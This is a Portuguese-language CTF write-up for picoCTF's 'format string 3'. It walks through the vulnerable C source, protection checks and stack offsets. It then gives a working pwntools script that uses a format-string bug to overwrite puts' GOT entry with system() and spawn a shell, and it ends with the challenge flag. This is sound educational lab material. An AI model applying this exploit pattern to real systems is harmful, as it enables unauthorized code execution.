# WriteUp: format string 3

## Descrição do Desafio:
Author: SkrubLawd \
Plataforma: [PicoCTF](https://play.picoctf.org/practice/challenge/449?category=6&page=1) \
Categoria: Binary Exploitation \
Dificuldade: Médio \
Data: 2024 \
Descrição:
> This program doesn't contain a win function. How can you win?

## Passo a Passo da Solução

### 1. Análise do arquivo fornecido
Este desafio, assim como os anteriores, fornece o código-fonte junto com os arquivos executáveis.

```c
#include <stdio.h>

#define MAX_STRINGS 32

char *normal_string = "/bin/sh";

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
}

void hello() {
	puts("Howdy gamers!");
	printf("Okay I'll be nice. Here's the address of setvbuf in libc: %p\n", &setvbuf);
}

int main() {
	char *all_strings[MAX_STRINGS] = {NULL};
	char buf[1024] = {'\0'};

	setup();
	hello();	

	fgets(buf, 1024, stdin);	
	printf(buf);

	puts(normal_string);

	return 0;
}
```
Por ser um código simples, não há muito o que analisar. 

Temos uma variável global contendo o valor `"/bin/sh"`, que nos daria acesso ao terminal caso fosse passado como parâmetro para a função `system()`.

Além disso, há uma função (`hello()`) que vaza um endereço da *libc*, e a `main()` contém uma vulnerabilidade de *format string* na chamada `printf(buf)`, seguida por uma chamada à `puts()` com `normal_string` como argumento.

### 2. Exploit
Com essas informações, podemos suspeitar que o *exploit* envolverá reescrever a entrada da `puts()` na tabela *.got*, alterando seu valor para o endereço da função `system()`. Dessa forma, quando a `main()` chamar `puts(normal_string)`, na realidade estará chamando `system(normal_string)`, abrindo um **shell**.

> 💡 **Nota:** Resumidamente, a tabela *.got* contém os endereços resolvidos das funções da *libc*. Como a *libc* é carregada separadamente, suas proteções podem diferir das do binário principal.

Antes de construir o *exploit*, é necessário verificar as proteções dos binários:

```bash
└─$ checksec --file=format-string-3
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   RW-RUNPATH   44 Symbols        No    0               2               format-string-3

└─$ checksec --file=libc.so.6           
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    DSO             No RPATH   No RUNPATH   No Symbols        Yes   83              178             libc.so.6
```
O executável não contém `PIE`, então seus endereços são sempre os mesmos, eliminando a necessidade de um vazamento para descobri-los. Além disso, ele possui `Partial RELRO`, o que significa que a tabela *.got* ainda pode ser reescrita através da vulnerabilidade de *format string*.

Já a *libc* está com `PIE` ativado, mas como temos um vazamento de endereço, podemos calcular a base da *libc* e encontrar a função `system()`.

Agora, precisamos descobrir o *offset* do nosso *input* dentro da pilha.

```bash
└─$ ./format-string-3
Howdy gamers!
Okay I'll be nice. Here's the address of setvbuf in libc: 0x7fc02480a3f0
%x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x 
24968963 fbad208b c2058eb0 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 a2078 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 
/bin/sh
```

Descobrimos que nosso *input* começa na **posição 38**.

### 3. Solução
O *exploit* pode ser construído, mas há algumas dificuldades técnicas:
- Endereços da *libc* (devido ao `PIE`) costumam ter 6 *bytes*, resultando em valores muito grandes para `printf()`. A solução é dividir o endereço da `system()` em três partes de 2 *bytes* e escrevê-las em ordem crescente para evitar problemas com `%n`.
- O tamanho do *payload* deve ser múltiplo de 8 para não corromper a pilha.
- Devemos garantir que os ponteiros corretos sejam usados com `%hn` para escrita de 2 *bytes*.

> 💡 **Nota:** `%n` escreve no ponteiro a quantidade de bytes impressos até o momento. Se um valor muito grande for escrito primeiro, valores menores se tornam impossíveis de escrever.

Com isso em mente, criamos o *script*:

```py
from pwn import *

elf = context.binary = ELF("./format-string-3")
libc = elf.libc
p = remote("rhea.picoctf.net", 56685)

# Pegando o endereço vazado.
p.recvuntil(b"libc: ")
setvbuf = int(p.recvline(keepends=False), 16)

# Calculando o endereço base da libc.
libc.address = setvbuf - libc.sym['setvbuf']

# Repartindo o endereço da system. Por ser little-endian o endereço deve ser escrito ao contrário, fazendo com que o high deva ser escrito no endereço sem offset, e o low com o offset. (O medium é o meio termo).
high = libc.sym["system"] & 0xFFFF
medium = (libc.sym["system"] >> 16) & 0xFFFF
low = (libc.sym["system"] >> 32) & 0xFFFF
parts = sorted([high, medium, low]) # Ordenando.

# Montando o payload, inputs começam na posição 38.
payload = f"%{parts[0]}x%43$hn%{parts[1] - parts[0]}x%44$hn%{parts[2] - parts[1]}x%45$hn"
while len(payload) % 8 != 0:
    payload += "|" # Padding.

# Adicionando endereços no payload.
payload = payload.encode()
payload += p64(elf.got["puts"] + (0 if parts[0] == high else 2 if parts[0] == medium else 4))
payload += p64(elf.got["puts"] + (0 if parts[1] == high else 2 if parts[1] == medium else 4))
payload += p64(elf.got["puts"] + (0 if parts[2] == high else 2 if parts[2] == medium else 4))

# Enviando payload.
p.sendline(payload)
p.interactive()
```

### Flag
`picoCTF{G07_G07?_92325514}` 

## Autor
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)
